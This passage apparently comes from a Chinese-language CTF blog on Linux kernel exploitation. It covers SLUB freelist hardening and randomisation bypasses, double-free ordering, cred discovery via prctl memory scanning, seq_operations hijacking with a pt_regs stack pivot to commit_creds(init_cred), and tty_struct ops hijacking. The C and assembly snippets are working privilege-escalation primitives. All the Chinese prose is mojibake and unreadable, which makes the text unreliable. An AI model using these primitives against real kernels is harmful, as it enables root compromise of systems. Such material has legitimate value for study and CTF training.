<p>å¦‚æœè¿œç¨‹çš„randomå€¼ä¼šå‘ç”Ÿæ”¹å˜çš„è¯ï¼Œé‚£ä¹ˆç›´æ¥å°†å½“å‰FD_valueå¼‚æˆ–éœ€è¦åŠ«æŒçš„fake_chunk_addrï¼Œé‚£ä¹ˆä¸€ç›´å°†freelistç”³è¯·å®Œï¼Œä¹‹åå†æ¥ç€ç”³è¯·å°±èƒ½å¾—åˆ°fake_chunk_addrã€‚è¿™ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿ç»­çš„ä¸¤ä¸ªFD_valueä¸­é—´4ä¸ªå­—èŠ‚æ˜¯å¦å‘ç”Ÿæ”¹å˜æ¥è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ”¹å˜äº†ï¼Œé‚£ä¹ˆä»£è¡¨freelistå³å°†ç»“æŸï¼Œè¿™æ—¶å€™å°±å¯ä»¥è¿›è¡Œä¿®æ”¹äº†ã€‚ä¸è¿‡ä¿®æ”¹ä¹‹åï¼Œè¯¥sizeçš„<code>kmem_cache</code>çš„freelisté“¾è¡¨å°±ä¼šæŸåï¼Œè¦ä¹ˆé‡æ–°ä¿®å¤ï¼Œè¦ä¹ˆå°±ç”³è¯·å…¶ä»–sizeçš„<code>kmem_cache</code>ã€‚</p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå¦‚æœå¼€äº†ä¸‹é¢çš„<code>RANDOM</code>ä¿æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬æµ‹å‡ºæ¥çš„randomå€¼å…¶å®å°±ä¸ä¸€å®šå‡†ç¡®äº†ï¼Œå› ä¸ºfreelistä¸­çš„chunkåœ°å€ä¸æ˜¯è¿ç»­çš„ï¼Œæˆ‘ä»¬ç”¨è¿ç»­çš„åœ°å€æ¥æµ‹åŠ¿å¿…å¯¼è‡´æµ‹å‡ºæ¥çš„randomå€¼çš„ä½2ä¸ªå­—èŠ‚ä¸åŒï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”³è¯·åˆ°freelistçš„æœ€åä¸€ä¸ªchunkï¼Œå–å¾—å…¶FDå€¼çš„ä½2ä¸ªå­—èŠ‚å’Œæˆ‘ä»¬ä¹‹å‰æµ‹å‡ºæ¥çš„randomä¸€åˆå¹¶å°±æ˜¯æœ€ç»ˆçš„randomå€¼äº†ã€‚ä¸è¿‡è¿™ä¸ªæ€ä¹ˆåˆ¤æ–­æ˜¯freelistçš„æœ€åä¸€ä¸ªchunkä¹Ÿæœ‰ç‚¹é—®é¢˜â€¦</p>

        <h5 id="double-free"   >
          <a href="#double-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h5>
      <p>åœ¨å¼€å¯äº†HARDENEDè¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºFDæŒ‡é’ˆä¼šæ·»åŠ ä¸€ä¸ªæ£€æµ‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mm/slub.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object, <span class="keyword">void</span> *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freeptr_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="keyword">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ£€æµ‹double_freeï¼Œå…¶å®å°±ç›¸å½“äºæ˜¯fastbinä¸­çš„double_freeæ£€æµ‹ï¼Œæ£€æµ‹freelistä¸­çš„ç¬¬ä¸€ä¸ªå’Œå³å°†æ”¾è¿›å…¥freelistä¸­çš„chunkæ˜¯å¦ç›¸ç­‰ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png" alt="image-20220308235157003"></p>
<p>æ‰€ä»¥åŒç†å¯å¾—ï¼Œä¹Ÿå¯ä»¥è¯´å¦‚ä¸‹ï¼Œåœ¨ä¸­é—´åŠ å…¥ä¸€ä¸ªchunkçš„freeå³å¯ç»•è¿‡</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free chunk1</span><br><span class="line">free chunk2</span><br><span class="line">free chunk1</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯åœ¨å†…æ ¸ç¯å¢ƒä¸‹ï¼Œå•¥æ—¶å€™éƒ½å¯èƒ½ç¢°åˆ°ç”³è¯·chunkï¼Œæ‰€ä»¥æœ‰æ—¶å€™å¯èƒ½å†ç”³è¯·çš„æ—¶å€™ä¸èƒ½æˆåŠŸç”³è¯·åˆ°chunk1-&gt;chunk2-&gt;chunk1çš„é¡ºåº</p>
<p>è¿™æ—¶å€™å¦‚æœæœ€å¥½è¿˜æ˜¯ç»‘å®šåˆ°ä¸€ä¸ªCPUä¸Š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç»‘å®šåˆ°ä¸€ä¸ªcpuä¸Š</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> cpu_mask = <span class="number">0x01</span>;</span><br><span class="line">sched_setaffinity(<span class="number">0</span>, <span class="number">1</span>, &amp;cpu_mask);</span><br></pre></td></tr></table></div></figure>




        <h4 id="3-RANDOMä¿æŠ¤"   >
          <a href="#3-RANDOMä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-RANDOMä¿æŠ¤" class="headerlink" title="(3)RANDOMä¿æŠ¤"></a>(3)RANDOMä¿æŠ¤</h4>
      <p>åœ¨v4.7åŠä¹‹åå­˜åœ¨ï¼Œç¼–è¯‘å†…æ ¸æ—¶åŠ å…¥<code>CONFIG_SLAB_FREELIST_RANDOM=y</code>é€‰é¡¹ï¼Œä¼šå¯ç”¨<code>Fisher-Yates</code>éšæœºæ’åˆ—ç®—æ³•æ‰“ä¹±freelistçš„é¡ºåº</p>
<p>è¿™ä¸ªæƒ…å†µä¸‹æ¯æ¬¡æ›´æ–°freelistçš„æ—¶å€™ï¼Œä¼šæ‰“ä¹±freelistä¸­ç©ºé—²çš„chunkï¼Œé€ æˆæ— æ³•ç®€å•ç”³è¯·åˆ°æŒ‡å®šçš„chunkï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥ä¿®æ”¹FDä¹‹åï¼Œå¤šæ¬¡ç”³è¯·ï¼Œä¹Ÿå¯ä»¥ç”³è¯·åˆ°ä¿®æ”¹ä¹‹åçš„chunkã€‚</p>
<p>ä¹Ÿæ˜¯å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€"   >
          <a href="#å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€" class="headerlink" title="å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€"></a>å€ŸåŠ©prctlå‡½æ•°å¯»æ‰¾credåœ°å€</h3>
      <p>ğŸ”ºæ³¨ï¼šéœ€è¦å­˜åœ¨ä»»æ„è¯»</p>
<p>prctlå‡½æ•°çš„PR_SET_NAMEåŠŸèƒ½å¯ä»¥è®¾ç½®task_structç»“æ„ä½“ä¸­çš„comm[TASK_COMM_LEN]æˆå‘˜ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">&quot;tryToFindPIG007&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME,target);</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åå†…å­˜æœç´¢å®šä½</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//search target chr</span></span><br><span class="line"><span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any memory&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">    arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">    result=memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (result)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;result:%p\n&quot;</span>,result);</span><br><span class="line">        cred= * (<span class="keyword">size_t</span> *)(result<span class="number">-0x8</span>);</span><br><span class="line">        real_cred= *(<span class="keyword">size_t</span> *)(result<span class="number">-0x10</span>);</span><br><span class="line">        <span class="keyword">if</span> ((cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">        &#123;</span><br><span class="line">            target_addr=addr+result-(<span class="keyword">int</span>)(buf);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åå†å€Ÿç”¨ä»»æ„å†™æˆ–è€…ä¿®æ”¹FDç”³è¯·æ¥ä¿®æ”¹credç»“æ„ä¸­çš„å†…å®¹å³å¯ã€‚</p>

        <h3 id="å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ"   >
          <a href="#å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ" class="headerlink" title="å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ"></a>å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ</h3>
      <p>åŸç†å°±æ˜¯åŠ«æŒ<code>seq_operations</code>ç»“æ„ä½“çš„å‡½æ•°æŒ‡é’ˆï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæµã€‚</p>
<p>è¥¿æ¹–è®ºå‰‘â€“easy_kernel</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >è¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›easykernelé¢˜è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æœ‰å¦‚ä¸‹ç»“æ„ä½“ï¼Œå¤§å°ä¸º0x20ï¼Œå½“æˆ‘ä»¬å¯ä»¥ç”³è¯·0x20å¤§å°çš„Chunkï¼Œç„¶åé‡Šæ”¾ï¼Œå†æ‰“å¼€<code>/proc/self/stat</code>è®¾å¤‡å°±å¯ä»¥å¾—åˆ°è¯¥ç»“æ„ä½“ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚æœå­˜åœ¨UAFä¹‹ç±»çš„å°±å¯ä»¥ä»é‡Œé¢è¯»å–å‡½æ•°åç§»ï¼Œè·å¾—kernelåŸºåœ°å€ï¼Œç„¶åè¿˜å¯ä»¥ä¿®æ”¹é‡Œé¢çš„startå‡½æ•°æŒ‡é’ˆï¼ŒåŠ«æŒä½¿å…¶æŒ‡å‘æˆ‘ä»¬çš„gadgetï¼Œå½“æˆ‘ä»¬å¯¹è¯¥è®¾å¤‡è¿›è¡Œè¯»å–æ“ä½œæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¯¥startæŒ‡é’ˆï¼Œä»è€Œè¿›å…¥åˆ°æˆ‘ä»¬åŠ«æŒçš„gadgetï¼Œè¿›è€Œå¯ä»¥ç¨‹åºæ§åˆ¶æ‰§è¡Œæµã€‚ä½¿ç”¨å¦‚ä¸‹æ±‡ç¼–è¿›è¡Œå¯¹è¯¥è®¾å¤‡çš„æ“ä½œã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>åŠ«æŒä¹‹åå†éœ€è¦getshellå°±éœ€è¦æ³¨æ„å¦ä¸€ä¸ªç»“æ„ä½“äº†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å½“æˆ‘ä»¬è°ƒç”¨syscallçš„æ—¶å€™ï¼Œä¼šå°†ä»¥ä¸Šå¯„å­˜å™¨å‹å…¥å†…æ ¸æ ˆä¸­ï¼Œç„¶åå½¢æˆå¦‚ä¸Šçš„ç»“æ„ï¼Œå³å¦‚ä¸‹æ±‡ç¼–æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x400db8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, user_rflags;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸Šçš„æ±‡ç¼–ä¼šåœ¨å†…æ ¸æ ˆä¸­å½¢æˆå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png" alt="image-20220115110535050"></p>
<p>æ‰€ä»¥å¦‚æœå€ŸåŠ©<code>add_rsp xx;pop_ret</code>è¿™ç±»æŒ‡ä»¤ï¼Œå°±å¯ä»¥å°†æˆ‘ä»¬çš„æ§åˆ¶æµçš„æ ˆæ‹‰é«˜åˆ°æˆ‘ä»¬å¯æ§æ•°æ®èŒƒå›´ï¼Œè¿›è€ŒåŠ«æŒæ ˆã€‚ä½¿ç”¨<code>commit(cred)</code>ææƒï¼ˆè¿™é‡Œçš„ææƒå› ä¸ºæ— æ³•æ§åˆ¶rdiï¼Œæ‰€ä»¥å°±å€ŸåŠ©<code>init_cred</code>æ¥ææƒï¼‰ã€‚ææƒä¹‹åå€ŸåŠ©<code>swapgs_restore_regs_and_return_to_usermode</code>å‡½æ•°ä¸­çš„popç³»åˆ—æ¥è°ƒæ•´æ ˆï¼Œå³å€Ÿç”¨äº†å‡ ä¸ªæ ˆçš„ä½ç½®ï¼Œå°±å¾—å°‘å‡ ä¸ªpopï¼Œå¦‚å›¾å€Ÿç”¨äº†5ä¸ªæ ˆæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ€åå°±å¾—ä½¿å¾—è¯¥å‡½æ•°å°‘pop5ä¸ªï¼Œå³å°†swapgs_restore_regs_and_return_to_usermodeå‡½æ•°çš„gadget+=9å³å¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode += <span class="number">9</span>;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png" alt="image-20220115113005162"></p>
<p>å¦‚ä¸Šä¿®æ”¹ä¹‹åå°±å¯ä»¥å½“è¿›å…¥åˆ°è¯¥å‡½æ•°çš„swapgsçš„æ—¶å€™ï¼Œå°†æ ˆè°ƒæ•´è‡³æœ€å¼€å§‹å› ä¸ºsyscallè€Œå½¢æˆçš„ä¿å­˜pt_regsç»“æ„ä½“ä¸­çš„ç”¨æˆ·æ€æ•°æ®çš„åœ°æ–¹ï¼Œä½¿å¾—ææƒä¹‹åæˆåŠŸè¿”å›ç”¨æˆ·æ€</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">//.....................</span></span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ç¤ºæ ˆå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png" alt="image-20220115113622350"></p>
<p>ä½¿ç”¨æ­¤ç§æ–¹æ³•æ—¶ä¸€èˆ¬å¯ä»¥å…ˆè®¾ç½®ä¸€äº›æ ‡å¿—æ€§æ•°æ®ï¼Œâ€œAAAAAAâ€åœ¨æ ˆä¸Šï¼Œç„¶åæœå¯»å³å¯ï¼Œä»¥æ­¤æ¥å¯»æ‰¾è°ƒæ ˆæ‰€ç”¨çš„gadgetã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x6565656565;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>ç„¶ååœ¨æŸä¸ªåœ°å€èŒƒå›´è¿›è¡Œæœç´¢ï¼Œå°±èƒ½æ‰¾åˆ°è¯¥ç»“æ„ä½“çš„ä½ç½®ï¼Œå¥½åƒåªèƒ½æ˜¯pedaæ¯”è¾ƒå¥½ç”¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;AAAAAA&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>


        <h3 id="å€ŸåŠ©ptmxè®¾å¤‡-tty-struct"   >
          <a href="#å€ŸåŠ©ptmxè®¾å¤‡-tty-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#å€ŸåŠ©ptmxè®¾å¤‡-tty-struct" class="headerlink" title="å€ŸåŠ©ptmxè®¾å¤‡(tty_struct)"></a>å€ŸåŠ©ptmxè®¾å¤‡(tty_struct)</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64`-&gt;`SyS_write`-&gt;`SYSC_write`-&gt;`vfs_write`</span><br><span class="line">-&gt;`__vfs_write`-&gt;`tty_write`-&gt;`do_tty_write`-&gt;`n_tty_write`-&gt;`pty_write`</span><br></pre></td></tr></table></div></figure>

<p>åŸç†å°±æ˜¯åŠ«æŒ<code>tty_struct</code>ç»“æ„ä½“ä¸­çš„<code>const struct tty_operations *ops</code>ç»“æ„ä½“æŒ‡é’ˆï¼Œç„¶åå†ä¿®æ”¹<code>fake_tty_operations</code>ç»“æ„ä½“ä¸­çš„<code>pty_write</code>å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡å¯¹è¯¥è®¾å¤‡è¿›è¡Œå†™æ“ä½œè¿›è€Œè°ƒç”¨åŠ«æŒçš„å‡½æ•°æŒ‡é’ˆï¼Œæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚</p>
